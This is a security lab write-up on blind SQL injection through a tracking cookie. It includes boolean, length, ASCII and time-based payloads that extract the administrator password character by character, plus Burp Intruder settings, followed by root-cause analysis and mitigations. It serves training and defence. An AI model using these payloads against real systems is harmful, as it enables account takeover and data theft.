# Lab 11: Blind SQL injection with conditional responses

## Category
SQL Injection - Blind SQLi (Conditional Responses)

## Vulnerability Summary
The website's tracking cookie contains a blind SQL injection vulnerability that allows attackers to extract sensitive information by observing conditional responses. Unlike error-based SQL injection, blind SQLi doesn't display database errors. Instead, the application responds differently based on whether the injected SQL condition evaluates to TRUE or FALSE. By injecting conditional SQL statements and observing changes in the HTTP response (status codes, content length, or page content), attackers can systematically extract data character-by-character.

## Steps to Reproduce
1. Navigate to the target website and observe the `TrackingId` cookie in HTTP requests.
2. Identify SQL injection point by injecting conditional payloads in the TrackingId cookie value.
3. Test for boolean-based blind SQLi using conditional payloads:
   - TRUE condition: `TrackingId=xyz' AND 1=1--` (should return normal response)
   - FALSE condition: `TrackingId=xyz' AND 1=2--` (should return different/empty response)
4. Observe response differences:
   - Status code 200 with normal content = TRUE condition
   - Status code 404 or different content = FALSE condition
5. Use Burp Suite Intruder with Sniper attack mode to automate extraction.
6. Configure Intruder positions on the TrackingId cookie value.
7. Create payload list for character-by-character extraction:
   - Payload format: `originalValue' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--`
8. Start the attack and analyze responses:
   - Status 200 with longer response = correct character found
   - Status 404 or shorter response = incorrect character
9. Iterate through each character position until the full password is extracted.
10. Use extracted credentials to log in as administrator.

![Lab 11 Screenshot 1](screenshot1.png)

## Technical Root Cause
The vulnerability stems from improper handling of cookie values in SQL query construction combined with conditional response behavior:

- **Unsanitized Cookie Input:** The TrackingId cookie value is directly concatenated into SQL queries without validation.
- **Missing Parameterization:** The application does not use parameterized queries or prepared statements.
- **Conditional Response Behavior:** The application returns different responses based on query results (200 vs 404).
- **Boolean-Based Oracle:** The response acts as a boolean oracle (TRUE/FALSE indicator).
- **No Rate Limiting:** The application doesn't limit the number of requests from a single source.
- **Predictable Query Structure:** The injection point allows full SQL expression injection.
- **Database User Permissions:** The database user has SELECT permissions on the users table.

### Payload Used
Basic conditional test:
```
TrackingId=abc123' AND 1=1--
TrackingId=abc123' AND 1=2--
```

Data extraction payload (character-by-character):
```
TrackingId=abc123' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
```

URL-encoded payload in cookie:
```
Cookie: TrackingId=abc123'+AND+1=1--
```

How it works:
- The original query likely looks like: `SELECT * FROM sessions WHERE trackingId = 'input'`
- The TRUE injection transforms it to: `SELECT * FROM sessions WHERE trackingId = 'abc123' AND 1=1--'`
- The FALSE injection transforms it to: `SELECT * FROM sessions WHERE trackingId = 'abc123' AND 1=2--'`
- When the condition is TRUE, the query returns a row and the application shows normal content (200).
- When the condition is FALSE, the query returns no rows and the application shows different content (404).
- By testing each character position with different values, the full password can be extracted.

### Blind SQLi Extraction Techniques

| Technique | Payload Example | Use Case |
|-----------|----------------|----------|
| Boolean-based | `' AND 1=1--` / `' AND 1=2--` | Initial detection |
| Character extraction | `' AND SUBSTRING((SELECT password FROM users),1,1)='a'--` | Extracting data |
| Length detection | `' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>10--` | Find password length |
| ASCII comparison | `' AND ASCII(SUBSTRING((SELECT password FROM users),1,1))>97--` | Binary search optimization |
| Time-based | `' AND PG_SLEEP(5)--` | When no response difference |

### Burp Suite Intruder Configuration

| Setting | Value |
|---------|-------|
| Attack Type | Sniper |
| Position | TrackingId cookie value |
| Payload Type | Simple list |
| Payload Example | `original' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--` |
| Grep - Status Codes | Monitor 200 vs 404 |
| Grep - Response Length | Monitor content length differences |

### Character Extraction Process

| Step | Payload | Expected Result (if correct) |
|------|---------|------------------------------|
| 1 | `' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--` | Status 200, Length ~11613 |
| 2 | `' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='b'--` | Status 404, Length ~131 |
| ... | Continue for each character | Identify correct character by response |
| N | `' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),2,1)='X'--` | Move to next position |

### Database-Specific Blind SQLi Functions

| Database | Substring Function | Length Function | ASCII Function | Conditional |
|----------|-------------------|-----------------|----------------|-------------|
| PostgreSQL | `SUBSTRING()` | `LENGTH()` | `ASCII()` | `AND`, `OR` |
| MySQL | `SUBSTRING()` | `LENGTH()` | `ASCII()` | `AND`, `OR` |
| SQL Server | `SUBSTRING()` | `LEN()` | `ASCII()` | `AND`, `OR` |
| Oracle | `SUBSTR()` | `LENGTH()` | `ASCII()` | `AND`, `OR` |

## Impact
- **Complete Credential Extraction:** Attackers can extract any database value character-by-character.
- **Administrator Account Takeover:** Full password extraction enables admin login.
- **Data Breach:** All sensitive data in the database can be systematically extracted.
- **Session Hijacking:** Tracking IDs can be manipulated to impersonate users.
- **Compliance Violation:** Violates data protection regulations (GDPR, PCI-DSS, HIPAA).
- **Legal Liability:** Organization may face lawsuits and regulatory fines.
- **Reputation Damage:** Public disclosure of data breach severely affects user trust.
- **Silent Exploitation:** Blind SQLi leaves minimal traces, making detection difficult.

## Mitigation
1. **Parameterized Queries:** Use prepared statements with parameterized queries for all database operations including cookie values.
2. **Input Validation:** Implement strict input validation for cookie values - only accept expected formats (e.g., UUID, alphanumeric).
3. **Secure Cookie Generation:** Use cryptographically secure random values for tracking IDs that don't map to database queries.
4. **Least Privilege:** Database accounts should have minimal permissions - restrict access to only necessary tables.
5. **Error Handling:** Implement generic error messages that don't reveal whether a query returned results.
6. **Consistent Responses:** Ensure TRUE and FALSE conditions return identical response structures to prevent oracle attacks.
7. **Rate Limiting:** Implement request rate limiting to slow down automated extraction attempts.
8. **Web Application Firewall:** Deploy WAF rules to detect and block SQL injection patterns in cookies.
9. **Regular Security Testing:** Conduct periodic penetration testing and code reviews for SQL injection.
10. **Session Management:** Use secure session management frameworks instead of custom tracking mechanisms.
11. **Monitoring:** Implement logging and alerting for suspicious patterns like high request volumes from single IPs.
12. **Cookie Security Flags:** Set Secure, HttpOnly, and SameSite flags on all cookies.

---
*Lab completed on: 2026-03-19*
